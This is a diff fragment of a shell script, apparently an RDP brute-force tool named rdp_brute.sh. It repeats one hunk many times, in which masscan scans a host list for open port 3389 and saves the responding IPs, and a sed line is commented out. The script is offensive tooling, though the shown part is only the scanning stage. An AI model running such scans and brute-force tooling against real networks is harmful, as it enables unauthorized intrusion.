@@ -15799,7 +15803,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15844,7 +15848,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15890,7 +15894,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15936,7 +15940,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15982,7 +15986,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16028,7 +16032,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16074,7 +16078,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16120,7 +16124,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16165,7 +16169,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16211,7 +16215,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16257,7 +16261,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16303,7 +16307,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16349,7 +16353,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16395,7 +16399,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16441,7 +16445,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16487,7 +16491,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16532,7 +16536,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16578,7 +16582,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16624,7 +16628,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16670,7 +16674,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16716,7 +16720,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16762,7 +16766,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16808,7 +16812,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16854,7 +16858,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16900,7 +16904,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16946,7 +16950,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -16992,7 +16996,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17038,7 +17042,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17084,7 +17088,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17130,7 +17134,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17176,7 +17180,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17222,7 +17226,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17266,7 +17270,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17312,7 +17316,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17357,7 +17361,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17403,7 +17407,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17449,7 +17453,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17495,7 +17499,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17541,7 +17545,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17587,7 +17591,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17633,7 +17637,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17679,7 +17683,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17725,7 +17729,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17771,7 +17775,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17817,7 +17821,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17863,7 +17867,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17909,7 +17913,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -17955,7 +17959,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18001,7 +18005,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18047,7 +18051,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18093,7 +18097,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18139,7 +18143,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18185,7 +18189,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18231,7 +18235,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18277,7 +18281,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18323,7 +18327,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18369,7 +18373,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18415,7 +18419,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18459,7 +18463,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18504,7 +18508,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18549,7 +18553,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18594,7 +18598,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18639,7 +18643,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18684,7 +18688,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18729,7 +18733,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18774,7 +18778,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18820,7 +18824,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
